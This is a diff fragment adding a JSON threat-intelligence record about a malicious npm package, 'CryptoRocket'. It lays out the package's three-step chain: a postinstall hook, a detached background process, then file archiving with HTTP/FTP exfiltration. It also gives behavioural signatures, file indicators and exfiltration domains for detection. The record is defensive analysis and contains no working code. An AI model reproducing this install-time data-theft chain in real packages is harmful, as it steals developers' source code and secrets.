+                    "collecting OS username and working directory without user interaction",
+                    "HTTP requests to hardcoded, attacker-controlled domains",
+                    "recursive search for sensitive files and directories",
+                    "creation of ZIP archives containing project or configuration files",
+                    "FTP upload of archives to external, untrusted servers"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (immediately after install, via detached process)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "CryptoRocket",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (multiple versions, ongoing since 2021)",
+                  "why_malicious": "CryptoRocket is malicious because it is engineered to automatically execute code upon installation that exfiltrates sensitive data—including source code, configuration files, and environment information—from the developer's machine to attacker-controlled infrastructure. The package structure (package.json, preinstall.js, index.js) is intentionally orchestrated to enable stealthy data theft and unauthorized remote communication, with no legitimate functionality."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering the postinstall script in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of preinstall.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "preinstall.js spawns index.js as a detached background process to persist after installation.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "index.js runs independently in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js collects user and environment data, recursively searches for sensitive files, archives them, and exfiltrates the data to attacker-controlled infrastructure via HTTP and FTP.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Data exfiltration and compromise of developer secrets"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package with postinstall script executing a custom JavaScript file (e.g., preinstall.js)",
+                    "installation-time spawning of detached background processes using child_process.spawn with detached: true",
+                    "runtime file system enumeration and archiving of sensitive files or directories",
+                    "network connections to hardcoded, untrusted external servers via HTTP or FTP",
+                    "creation and FTP upload of ZIP archives containing project or configuration files immediately after installation"
+                  ],
+                  "file_indicators": [
+                    "package.json with a postinstall script referencing preinstall.js",
+                    "presence of both preinstall.js and index.js in the package root directory",
+                    "creation of ZIP archives containing source code or configuration files in the user's project directory"
+                  ],
+                  "network_indicators": [
+                    "HTTP GET requests to attacker-controlled domains/IPs (see IOC list)",
+                    "FTP connections to unknown external servers for file uploads",
+                    "Domains: oastify.com, requestbin.net, canarytokens.com, oast.fun, pipedream.net, nirobtest.xyz, marcomayo.com, npmtesttut.com"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that launch custom JavaScript files, especially those that spawn detached background processes. Flag packages containing both preinstall.js and index.js with logic for file system enumeration and network exfiltration. Detect outbound HTTP or FTP connections to known malicious domains or IPs, and alert on ZIP archive creation containing sensitive project files immediately after package installation. Correlate these behaviors to identify coordinated data exfiltration attempts."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
